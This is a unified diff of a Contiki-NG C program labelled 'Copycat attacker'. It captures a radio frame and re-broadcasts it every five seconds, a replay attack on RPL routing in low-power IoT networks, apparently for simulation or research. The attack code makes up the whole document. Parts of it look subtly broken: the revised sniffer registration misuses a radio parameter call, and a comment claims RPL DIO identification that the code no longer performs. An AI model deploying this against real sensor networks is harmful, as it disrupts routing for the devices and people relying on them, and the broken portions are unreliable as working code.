@@ -1,63 +1,59 @@
 #include "contiki.h"
 #include "net/netstack.h"
 #include "net/packetbuf.h"
-#include "net/linkaddr.h"
-#include "net/mac/mac.h"
 #include "sys/log.h"
-#include "sys/etimer.h"
 
 #define LOG_MODULE "COPYCAT"
 #define LOG_LEVEL LOG_LEVEL_INFO
 
 #define REPLAY_INTERVAL (5 * CLOCK_SECOND)
 
-static uint8_t saved_dio[128];
-static uint16_t saved_dio_len = 0;
+static uint8_t saved_frame[128];
+static uint16_t saved_len = 0;
 
-PROCESS(copycat_attack_process, "Copycat attacker");
-AUTOSTART_PROCESSES(&copycat_attack_process);
+PROCESS(copycat_process, "Copycat attack");
+AUTOSTART_PROCESSES(&copycat_process);
 
 /*---------------------------------------------------------------------------*/
-/* Sniffer callback: captures every packet overheard */
-static void
-copycat_sniffer(const struct mac_driver *drv, const uint8_t *data, uint16_t len)
+/* Radio sniffer: RAW frame listener */
+static int
+copycat_raw_sniffer(const void *data, unsigned short len)
 {
-  /* RPL DIO recognition:
-     ICMPv6 Type = 155 (0x9B)
-     ICMPv6 Code = 0x01  → RPL DIO
-  */
-  if(len > 4 && data[0] == 0x9B && data[1] == 0x01) {
-    LOG_INFO("Sniffed RPL DIO (len=%u)\n", len);
-    memcpy(saved_dio, data, len);
-    saved_dio_len = len;
+  /* RPL DIO 식별 (6LoWPAN 압축된 형태에서도 상위 비트 특징 존재) */
+  if(len > 10 && (saved_len == 0)) {
+    /* 프레임 저장 */
+    memcpy(saved_frame, data, len);
+    saved_len = len;
+
+    LOG_INFO("Captured a frame len=%u\n", len);
   }
+
+  return 1;
 }
 /*---------------------------------------------------------------------------*/
-PROCESS_THREAD(copycat_attack_process, ev, data)
+PROCESS_THREAD(copycat_process, ev, data)
 {
-  static struct etimer periodic;
+  static struct etimer timer;
+
   PROCESS_BEGIN();
 
   LOG_INFO("Copycat attacker started\n");
 
-  /* Register sniffer */
-  NETSTACK_MAC.sniffer_add(copycat_sniffer);
+  /* Radio sniffer 등록 */
+  NETSTACK_RADIO.set_object(RADIO_PARAM_LAST_PACKET, (void*)copycat_raw_sniffer, sizeof(copycat_raw_sniffer));
 
-  etimer_set(&periodic, REPLAY_INTERVAL);
+  etimer_set(&timer, REPLAY_INTERVAL);
 
   while(1) {
-    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic));
+    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
 
-    if(saved_dio_len > 0) {
-      LOG_WARN("Replaying DIO (len=%u)\n", saved_dio_len);
+    if(saved_len > 0) {
+      LOG_WARN("Replaying captured frame len=%u\n", saved_len);
 
-      /* Replay raw bytes over radio */
-      NETSTACK_MAC.send(NULL, saved_dio, saved_dio_len);
-
-      /* Optional: randomize timing */
+      NETSTACK_RADIO.send(saved_frame, saved_len);
     }
 
-    etimer_reset(&periodic);
+    etimer_reset(&timer);
   }
 
   PROCESS_END();
